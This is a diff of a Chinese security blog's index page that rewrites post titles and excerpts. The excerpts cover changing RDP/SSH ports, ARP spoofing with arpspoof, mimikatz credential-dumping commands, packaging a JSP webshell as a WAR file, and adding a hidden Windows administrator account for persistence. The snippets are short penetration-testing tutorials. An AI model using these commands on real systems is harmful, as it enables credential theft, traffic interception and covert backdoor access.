@@ -457,14 +457,14 @@
       <h2 class="index-header">
         
         <a href="/2021/01/28/Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%AB%AF%E5%8F%A3%E5%92%8Cssh%E7%AB%AF%E5%8F%A3%E4%BF%AE%E6%94%B9/" target="_self">
-          Windows远程桌面端口和ssh端口修改
+          Windows 远程桌面端口和 SSH 端口修改
         </a>
       </h2>
 
       
       <a class="index-excerpt index-excerpt__noimg" href="/2021/01/28/Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%AB%AF%E5%8F%A3%E5%92%8Cssh%E7%AB%AF%E5%8F%A3%E4%BF%AE%E6%94%B9/" target="_self">
         <div>
-          🚀 0、简介​	修改远程桌面和ssh的默认端口，可以简单预防被爆破的困扰。 ​	注意！阿里云、腾讯云等，修改前一定…一定..一定.记得在安全组策略中放通端口。 📌 1、远程桌面默认端口修改​	打开注册表，修改PortNumber键值。 1计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdp
+          🚀 0. 简介修改 远程桌面 (RDP) 和 SSH 的默认端口，是最简单的防爆破手段之一。  ⚠️ 重要提醒如果是在 阿里云、腾讯云 等云服务器上，修改前务必先在安全组策略里放行新的端口，否则可能会把自己锁在服务器外！   📌 1. 修改 Windows 远程桌面默认端口1️⃣ 打开注册表编辑器：Win + R ➜ 输入 regedit ➜ 回车 2️⃣ 找到键值路径： 1计算机\HKEY_
         </div>
       </a>
 
@@ -511,14 +511,14 @@
       <h2 class="index-header">
         
         <a href="/2020/04/30/kali%E7%B3%BB%E7%BB%9F(%E4%B8%AD%E9%97%B4%E4%BA%BA)arp%E6%94%BB%E5%87%BB/" target="_self">
-          kali系统(中间人)arp攻击
+          Kali系统中间人攻击 — ARP欺骗详解
         </a>
       </h2>
 
       
       <a class="index-excerpt index-excerpt__noimg" href="/2020/04/30/kali%E7%B3%BB%E7%BB%9F(%E4%B8%AD%E9%97%B4%E4%BA%BA)arp%E6%94%BB%E5%87%BB/" target="_self">
         <div>
-          0、简介arp攻击又称为中间人攻击，是一种在局域网中使用的攻击手段。  1、断网攻击攻击时,目标网络断开。攻击结束后,目标网络恢复。 1234# 探测存活主机fping -a -g 192.168.118.1/24# arpspoof -i 网卡 -t 目标IP 网关arpspoof -i eth0 -t 192.168.118.138 192.168.118.2     2、arp欺骗arp欺骗
+          0、简介ARP攻击，又称为中间人攻击（Man-in-the-Middle，MITM），是局域网中常见的一种攻击手法。攻击者通过伪造ARP响应包，将自己的MAC地址欺骗成网关或目标主机的MAC地址，从而截获、篡改甚至中断网络流量，实现对通信内容的监听和控制。 这种攻击威力强大且隐蔽，常用于网络钓鱼、数据窃取以及会话劫持等攻击场景，是网络安全防御中不可忽视的风险。  1、断网攻击断网攻击是利用ARP欺
         </div>
       </a>
 
@@ -557,9 +557,11 @@
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/arp%E6%94%BB%E5%87%BB/">#arp攻击</a>
+              <a href="/tags/ARP%E6%94%BB%E5%87%BB/">#ARP攻击</a>
             
-              <a href="/tags/kali/">#kali</a>
+              <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">#中间人攻击</a>
+            
+              <a href="/tags/Kali-Linux/">#Kali Linux</a>
             
           </div>
         
@@ -581,7 +583,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2020/03/19/mimikatz%20%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/" target="_self">
         <div>
-          0、简介mimikatz可以获取Windows的账户密码 下载地址：https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200308-1  1、命令12345#日志记录所有操作log#获取用户密码privilege::debugsekurlsa::logonpasswords  2、保存内存procdump64 是微软官方出的一款
+          📌 0、简介mimikatz 可以从 Windows 内存中获取账户明文密码、哈希、PIN、票据等敏感信息。 下载地址：👉 mimikatz 2.2.0-20200308-1  📌 1、常用命令12345678# 开始记录日志log# 获取调试权限（必须）privilege::debug# 列出当前登录用户凭据sekurlsa::logonpasswords   📌 2、保存内存转储Wi
         </div>
       </a>
 
@@ -637,14 +639,14 @@
       <h2 class="index-header">
         
         <a href="/2020/01/13/%E5%88%B6%E4%BD%9C%20war%E5%90%8E%E9%97%A8%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%20getshell/" target="_self">
-          制作 war后门，上传木马 getshell
+          制作 WAR 后门，实现上传木马拿 Shell
         </a>
       </h2>
 
       
       <a class="index-excerpt index-excerpt__noimg" href="/2020/01/13/%E5%88%B6%E4%BD%9C%20war%E5%90%8E%E9%97%A8%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%20getshell/" target="_self">
         <div>
-          0、简介发现后台有war上传点，尝试拿一下webshell。  1、制作war木马[管理员模式]打开CMD，执行下面的命令 123cd &quot;C:\Program Files\Java\jdk1.8.0_131\bin&quot; # 制作war文件jar cvf shell.war xx.jsp     2、getshell上传shell.war木马文件，使用蚁剑或菜刀链接： http:/
+          0、简介发现后台存在 WAR 文件上传点，可以通过上传带有后门的 WAR 包，实现 Webshell 的落地和远程控制。     1、制作 WAR 木马以管理员权限打开 CMD，切换到 JDK 的 bin 目录，使用 jar 命令将 JSP 木马打包成 WAR 文件。 12cd &quot;C:\Program Files\Java\jdk1.8.0_131\bin&quot;jar cvf s
         </div>
       </a>
 
@@ -824,7 +826,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2019/12/06/Windows%E7%B3%BB%E7%BB%9F%E6%B7%BB%E5%8A%A0%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7/" target="_self">
         <div>
-          🚀 0、简介提权成功后，维持权限可以添加隐藏账户。 📌 1、命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password /addnet localgroup administrators hacker$ /add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   📌 2、注册表隐藏 更改 HKEY_LOC
+          🚀 0、简介​	在 Windows 提权成功后，为了维持访问权限，攻击者往往会添加一个隐藏账户 🕵️‍♂️。这种账户可以绕过常规检测，达到后门驻留效果，适用于渗透测试与红队演练中对持久化的研究。  📌 1、命令行隐藏账户​	可以使用 net user 命令新建一个带 $ 符号的用户，这种账户不会在 net user 命令结果里显示，但依然存在于系统中 ⚙️。 12345# 创建一个以 $ 结
         </div>
       </a>
 
